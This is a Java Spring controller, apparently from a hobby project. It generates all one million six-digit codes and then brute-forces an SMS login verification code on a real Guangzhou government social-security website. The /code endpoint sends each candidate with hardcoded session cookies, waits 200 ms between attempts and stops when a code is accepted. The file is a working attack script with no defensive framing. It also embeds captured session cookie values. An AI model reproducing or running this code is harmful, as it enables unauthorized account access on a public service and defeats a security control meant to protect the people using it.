package wqz.model.sbmm.busproject.controller;

import com.alibaba.fastjson.JSONObject;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicHeader;
import org.apache.http.util.EntityUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import wqz.model.sbmm.busproject.mapper.TbCodeMapper;
import wqz.model.sbmm.busproject.mapper.TbUserMapper;
import wqz.model.sbmm.busproject.model.TbCode;
import wqz.model.sbmm.busproject.service.TbCodeService;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

@RestController
@RequestMapping("/test")
public class TestController {
    @Autowired
    TbUserMapper tbUserMapper;

    @Autowired
    TbCodeMapper codeMapper;

    @Autowired
    TbCodeService codeService;

    @GetMapping("/buildData")
    public void buildData() {
        int limit = 10;
        Long sum = 0L;
        List<TbCode> tempList = new ArrayList<>();
        for (int i = 0; i < limit; i++) {
            for (int j = 0; j < limit; j++) {
                for (int k = 0; k < limit; k++) {
                    for (int l = 0; l < limit; l++) {
                        for (int m = 0; m < limit; m++) {
                            for (int n = 0; n < limit; n++) {
                                sum++;
                                String code = String.valueOf(i) + String.valueOf(j) + String.valueOf(k) +
                                        String.valueOf(l) + String.valueOf(m) + String.valueOf(n);
                                TbCode tbCode = new TbCode(String.valueOf(sum), code);
                                tempList.add(tbCode);
                                if (tempList.size() >= 5000) {
                                    codeMapper.insertList(tempList);
                                    tempList.clear();
                                }
                            }
                        }
                    }
                }
            }
        }

        if (tempList.size() > 0) {
            codeMapper.insertList(tempList);
        }
    }

    @GetMapping("/getCKey")
    public TbCode getCKey(){
        return codeService.getCKey();
    }

    @GetMapping("/code")
    public void code(HttpServletRequest request) throws IOException, InterruptedException {
        TbCode tbCode = codeService.getCKey();
        while (null != tbCode){
            String code = tbCode.getcKey();
            JSONObject jsonObject = getResult(code);
            if(!jsonObject.getString("flag").equals("0")){
                System.out.println("+++++++++++++++++++++++++++++++++++++");
                System.out.println("+++++++++++++++++++++++++++++++++++++");
                System.out.println("+++++++++++++++++++++++++++++++++++++");
                System.out.println("+++++++++++++++++++++++++++++++++++++");
                System.out.println("+++++++++++++++++++++++++++++++++++++");
                System.out.println("+++++++++++++++++++++++++++++++++++++");
                System.out.println("+++++++++++++++++++++++++++++++++++++");
                System.out.println(code);
                System.out.println(jsonObject.getString("flag"));
                System.out.println("");
                tbCode.setValue("success");
                codeMapper.updateByPrimaryKey(tbCode);
                return;
            }else {
                System.out.println("验证码错误：" + code);
                tbCode.setValue("fail");
                codeMapper.updateByPrimaryKey(tbCode);
                Thread.sleep(200);
            }
            tbCode = codeService.getCKey();
        }
    }

    private JSONObject getResult(String code) throws IOException {
        String rtime = System.currentTimeMillis() + "";
        String url = "http://gzlss.hrssgz.gov.cn/gzlss_web/business/anon/LetterVistsSMSCode/checkValidateCode.xhtml?buscode=LOGIN_BUSSINESS_CODE&code=" +
                code + "&rtime=" + rtime;
        JSONObject resultJson;
        CloseableHttpClient httpclient = HttpClients.createDefault();
        HttpGet httpGet = new HttpGet(url);

        String cookies = "yfx_c_g_u_id_10004145=_ck19080716150614721844551773783; yfx_f_l_v_t_10004145=f_t_1565165706443__r_t_1565165706443__v_t_1565165706443__r_c_0; iCo9PwW9p8=MDAwM2IyYzhjYzAwMDAwMDAwMjEwEx86dGcxNTY3ODg0NzE4; JSESSIONID=_f8LfXX8yAEj8aQ-g1VrfAULsiiQSWmvvCreGKSxlOJNzpfKSxBc!-1520457455";
        httpGet.setHeader("Connection", "keep-alive");
        httpGet.addHeader(new BasicHeader("Cookie", cookies));

        CloseableHttpResponse response = httpclient.execute(httpGet);
        try {
            HttpEntity entity = response.getEntity();
            String str = EntityUtils.toString(entity, "UTF-8").trim();
            resultJson = JSONObject.parseObject(str);
            // 确保响应头完成响应
            EntityUtils.consume(entity);
        } finally {
            response.close();
        }
        return resultJson;
    }
}
